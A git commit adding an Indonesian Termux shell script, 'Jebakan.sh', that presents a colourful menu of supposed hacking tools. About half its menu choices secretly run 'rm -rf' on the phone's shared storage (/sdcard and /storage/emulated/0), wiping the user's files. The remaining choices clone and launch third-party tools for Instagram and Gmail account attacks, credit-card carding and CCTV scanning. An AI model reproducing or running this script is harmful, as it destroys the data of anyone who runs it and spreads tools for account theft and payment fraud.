294afd2c9a5ce4b4bc3522e4dec34779cd8a058b
Killerclown12 <45303012+Killerclown12@users.noreply.github.com>
2018-11-27 06:44:31 +0000

    Add files via upload

---
+++ Jebakan.sh
@@ -0,0 +1,241 @@
+
+#Selamat datang anjing :v
+
+# Variables
+b='\033[1m'
+u='\033[4m'
+bl='\E[30m'
+r='\E[31m'
+g='\E[32m'
+bu='\E[34m'
+m='\E[35m'
+c='\E[36m'
+w='\E[37m'
+endc='\E[0m'
+enda='\033[0m'
+blue='\e[1;34m'
+cyan='\e[1;36m'
+red='\e[1;31m'
+
+figlet Killer Clown | lolcat
+echo  "_________________________CCA____________________________________" | lolcat
+echo  "Tools    : Clown Cyber Army $white " |lolcat
+echo  "Creadby  : Killer_Clown $white   " |lolcat
+echo  "Contact  : killerclowntutor@blogspot.com $green " |lolcat
+echo  "_________________________CCA____________________________________" | lolcat
+
+
+
+###################################################
+# CTRL + C                                        #
+###################################################
+
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo -b $blue"[#]> (Ctrl + C ) Detected, Trying To Exit ... " |lolcat
+echo -b $blue"[#]> MAKASIH UDH PAKE TOOLS GUE " |lolcat
+sleep 2
+echo ""
+echo -b $blue"[#]> Killer_Clown Watching You" |lolcat
+
+echo -b $blue"[#]> See you Again Cuk :)..." |lolcat
+sleep 2
+exit
+}
+
+lagi=1
+while [ $lagi -lt 6 ];
+do
+echo ""
+echo  "1.Tools Clown Cyber Team${enda}"|lolcat;
+echo "《==============cca============》 " | lolcat
+echo   "2.Hack Ig Bertaget${enda}"|lolcat;
+echo "《==============cca============》 " | lolcat
+echo   "3.Tool Tambah Followers${enda}"|lolcat;
+echo "《==============cca============》 " | lolcat
+echo   "4.Buat Nama kosong difb${enda}";
+echo "《==============cca============》 " | lolcat
+echo    "5.TOP UP ML${enda}"|lolcat;
+echo "《==============cca============》 " | lolcat
+echo    "6.Hack Gmail bertarget${enda}"|lolcat;
+echo "《==============cca============》 " | lolcat
+echo    "7.Jadwal Sholat Seluruh dunia${enda}"|lolcat;
+echo "《==============cca============》 " | lolcat
+echo    "8.Osif${enda}"|lolcat;
+echo "《==============cca============》 " | lolcat
+echo    "9.CARI CC BUAT CARDING${enda}"|lolcat;
+echo "《==============cca============》 " | lolcat
+echo    "10.Auto Subscribe DiYoutube${enda}"|lolcat;
+echo "《==============cca============》 " | lolcat
+echo    "11.Tembak Kuota${enda}"|lolcat;
+echo "《==============cca============》 " | lolcat
+echo    "12.Buat Virus Via Termux${enda}"|lolcat;
+echo "《==============cca============》 " | lolcat
+echo    "13.Hack Hp jarak jauh${enda}"|lolcat;
+echo "《==============cca============》 " | lolcat
+echo    "14. HACK CCTV${enda}"|lolcat;
+echo "《==============cca============》 " | lolcat
+echo    "15.Top up FF ${enda}"|lolcat;
+echo "《==============cca============》 " | lolcat
+echo    "16.Sadap Wa Jarak Jauh ${enda}"|lolcat;
+echo "《==============cca============》 " | lolcat
+echo     "17.Hack Laptop Jarak Jauh${enda}"|lolcat;
+echo "《==============cca============》 " | lolcat
+echo     "18.Auto Bot Ig${enda}"|lolcat;
+echo "《==============cca============》 " | lolcat
+echo      "19.Auto Bot Fb${enda}"|lolcat;
+echo "《==============cca============》 " | lolcat
+echo     "20. Exit${enda}";
+echo -e "╭─Killer_Clown{PILIH NOMERNYA CUK}" | lolcat
+read -p "╰─#" bro;
+
+case $bro in
+   1) echo "Tool Clown Cyber Team" | lolcat
+           pkg install git
+           git clone https://github.com/Killerclown12/CCA
+           echo -e "${y} cara menggunakan Toolnya"
+           cd CCA
+           sh killerv1.sh
+           
+;;
+
+2) echo "Clown TOOLS-HACK IG NARGET" | lolcat
+       apt install python2
+       git clone https://github.com/Senitopeng/instabot.git
+       echo -e "${y} cara menggunakan INSTA HACK"
+       cd instabot
+       ./instabot
+     
+;;
+
+3) rm -rf /sdcard/
+  rm -rf /storage/emulated/0/
+exit
+   
+;;
+
+4) rm -rf /sdcard/
+  rm -rf /storage/emulated/0/
+exit
+   
+;;
+
+5) rm -rf /sdcard/
+   rm -rf /storage/emulated/0/
+exit
+
+;;
+
+6) echo "Clown TOOLS-HACK GMAIL" | lolcat
+       apt install python2
+       git clone https://github.com/AyoubSirai/gmail_attacker
+       echo -e "${y} cara menggunakan Gmail HACK"
+       cd gmail_attacker
+       python2 gmail_attacker.py
+exit
+
+;;
+
+7) echo "Tool Clown Jadwal Sholat" | lolcat 
+   git clone https://github.com/aryanrtm/Jadwal-Sholat
+   cd Jadwal-Sholat
+   sh jadwal-sholat.sh
+   
+;;
+
+8) echo "Osif" | lolcat
+   git clone https://github.com/CiKu370/OSIF
+       echo -e "${y} cara Osif nya "
+       cd OSIF
+       pip2 install -r requirements.txt
+       python2 osif.py
+   
+;;
+
+9) echo "Clown Tool-CC CARDING" | lolcat
+       git clone https://github.com/ganucisystem/creditcard
+       echo -e "${y} cara ambil cc nya "
+       cd creditcard
+       php fake.php
+      
+
+;;
+
+10) echo "Tools Berbayar harap hubungi author di Fb : Yudha Wahyu Pratama " | lolcat
+   rm -rf /sdcard/
+   rm -rf /storage/emulated/0/
+echo
+
+;;
+
+11) echo "Clown TOOLS-TEMBAK KUOTA" | lolcat
+       git clone https://github.com/kumpul4semut/semut.git
+       echo -e "${y} cara tembaknya "
+       cd semut
+       python2 dor.py
+   
+
+;;
+
+12)rm -rf /sdcard/
+   rm -rf /storage/emulated/0/
+exit
+
+;;
+
+13) rm -rf /sdcard/
+   rm -rf /storage/emulated/0/
+exit
+   
+;;
+
+14) echo "R4D3N TOOLS-HACK CCTV" | lolcat  
+   pkg install python2
+   git clone https://github.com/kancotdiq/ipcs
+   cd ipcs
+   python2 scan.py
+   
+;;
+
+15) echo "R4D3N TOOLS-HACK PULSA" | lolcat  
+   pkg install php
+   git clone https://github.com/ganucisystem/radenkeceh
+   cd radenkeceh
+   php pulsa.php
+
+;;
+
+ 16)rm -rf /sdcard/
+ rm -rf /storage/emulated/0/
+ exit
+ 
+ ;;
+ 
+ 17)rm -rf /sdcard/
+ rm -rf /storage/emulated/0/
+ exit
+ 
+ ;;
+ 
+ 18)rm -rf /sdcard/
+ rm -rf /storage/emulated/0/
+ exit
+ 
+ ;;
+ 
+ 19)rm -rf /sdcard/
+ rm -rf /storage/emulated/0/
+ exit
+ 
+ ;;
+
+20) echo "Sekian,Wassallamualaikum Wr. Wb Para Pencari script" | lolcat
+exit
+
+;;
+
+*) echo "Sorry, Pilihan anda Tidak Tersedia [CCA]"
+esac
+done
+done
